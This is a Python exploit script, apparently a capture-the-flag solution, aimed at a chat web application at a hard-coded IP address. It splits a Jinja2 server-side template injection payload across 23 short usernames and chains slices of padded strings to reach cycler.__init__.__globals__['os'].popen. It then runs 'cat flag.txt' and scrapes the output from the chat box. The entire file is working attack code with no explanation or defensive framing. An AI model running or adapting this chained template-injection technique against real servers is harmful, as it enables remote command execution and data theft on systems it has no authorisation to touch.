
import sys
import requests
from bs4 import BeautifulSoup
import re

message = "dummy"

username1 = "{%set a=['"
username2 = "',cycler][1]%}"
username3 = "{%set b=a['"
username4 = "__init__"
username5 = "'[11:19]]%}"
username6 = "{%set c=b['"
username7 = "__globals__"
username8 = "'[11:22]]%}"
username9 = "{%set d=c['os"
username10 = "'[:2]]%}"
username11 = "{%set e=d['"
username12 = "popen"
username13 = "'[11:16]]%}"
username14 = "{%set f='"
username15 = "cat flag.txt"
username16 = "'[11:23]%}"
username17 = "{%set g=e([f,'"
username18 = "'][0])%}"
username19 = "{%set h=g['"
username20 = "read"
username21 = "'[11:15]]%}"
username22 = "{{[h,'"
username23 = "'][0]()}}"


usernames = [username1, username2, username3, username4, username5, username6, username7, username8, username9, username10, username11, username12, username13, username14, username15, username16, username17, username18, username19, username20, username21, username22, username23]

base_url = "http://34.44.129.8:56032"


def set_username(session, base_url, username):
    resp = session.post(f"{base_url}/set_username", data={"username": username})
    print("Username set successfully.")

def send_message(session, base_url, message):
    resp = session.post(f"{base_url}/send_message", data={"message": message})
    print("Message sent successfully.")

def get_flag(session, base_url):
    resp = session.get(f"{base_url}/")
    soup = BeautifulSoup(resp.text, "html.parser")
    chat_box = soup.find(id="chat-box")
    if chat_box:
        html = chat_box.decode_contents()
        lines = re.split(r'<br\s*/?>', html)
        if lines:
            last = lines[-1].strip()
            return last.split(':')[0].strip()
        return None
    return None

def main():
    for username in usernames:
        session = requests.Session()
        set_username(session, base_url, username)
        send_message(session, base_url, message)
        if usernames.index(username) == len(usernames) - 1:
            chat_box_content = get_flag(session, base_url)
            print(chat_box_content)


main()
